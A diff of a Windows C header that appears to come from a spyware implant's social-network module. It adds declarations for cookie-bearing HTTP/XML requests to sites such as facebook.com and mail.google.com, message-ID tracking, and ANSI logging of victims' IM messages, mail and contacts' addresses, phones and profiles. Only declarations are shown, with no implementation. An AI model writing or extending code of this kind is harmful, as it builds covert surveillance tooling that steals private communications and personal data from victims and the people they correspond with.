@@ -3,7 +3,7 @@
 #include <Windows.h>
 #pragma pack(1)
 
-#define SOCIAL_ENTRY_COUNT 6
+#define SOCIAL_ENTRY_COUNT 8
 
 #define FACEBOOK_DOMAIN L"facebook.com" // FIXME array-izza!
 #define GMAIL_DOMAIN	L"mail.google.com"
@@ -33,6 +33,8 @@
 
 #define SOCIAL_MAX_ACCOUNTS 500 
 #define SOCIAL_INVALID_TSTAMP 0xFFFFFFFF
+
+#define SOCIAL_INVALID_MESSAGE_ID 0xFFFFFFFF
 
 #define CHAT_PROGRAM_FACEBOOK 0x02
 #define CHAT_PROGRAM_TWITTER  0x03
@@ -114,6 +116,19 @@ typedef struct SOCIAL_MAIL_MESSSAGE_HEADER
 VOID SocialMain();
 BOOL IsInterestingDomainW(LPWSTR strDomain);
 BOOL IsInterestingDomainA(LPSTR strDomain);
+
+DWORD XmlHttpSocialRequest(
+	__in LPWSTR strHostName, 
+	__in LPWSTR strHttpVerb, 
+	__in LPWSTR strHttpRsrc, 
+	__in DWORD dwPort, 
+	__in LPBYTE *lpSendBuff, 
+	__in DWORD dwSendBuffSize, 
+	__out LPBYTE *lpRecvBuff, 
+	__out DWORD *dwRespSize, 
+	__in LPSTR strCookies,
+	__in LPWSTR strReferer);
+
 DWORD HttpSocialRequest(
 	__in LPWSTR strHostName, 
 	__in LPWSTR strHttpVerb, 
@@ -129,6 +144,8 @@ BOOL SocialSaveTimeStamps();
 DWORD SocialGetLastTimestamp(__in LPSTR strUser, __out LPDWORD dwHighPart);
 VOID SocialSetLastTimestamp(__in LPSTR strUser, __in DWORD dwLowPart, __in DWORD dwHighPart);
 
+DWORD SocialGetLastMessageId(__in LPSTR strUser);
+VOID SocialSetLastMessageId(__in LPSTR strUser, __in UINT64 messageId);
 
 VOID SocialLogIMMessageA(
 	__in DWORD dwProgram, 
@@ -162,6 +179,20 @@ VOID SocialLogContactW(
 	__in LPWSTR strHomePhone,
 	__in LPWSTR strScreenName, 
 	__in LPWSTR strFacebookProfile,
+	__in DWORD dwFlags);
+
+VOID SocialLogContactA(
+	__in DWORD dwProgram,
+	__in LPSTR strUserName,
+	__in LPSTR strEmail,
+	__in LPSTR strCompany,
+	__in LPSTR strHomeAddr,
+	__in LPSTR strOfficeAddr,
+	__in LPSTR strOfficePhone,
+	__in LPSTR strMobilePhone,
+	__in LPSTR strHomePhone,
+	__in LPSTR strScreenName, 
+	__in LPSTR strFacebookProfile,
 	__in DWORD dwFlags);
 
 VOID SocialLogMailFull(
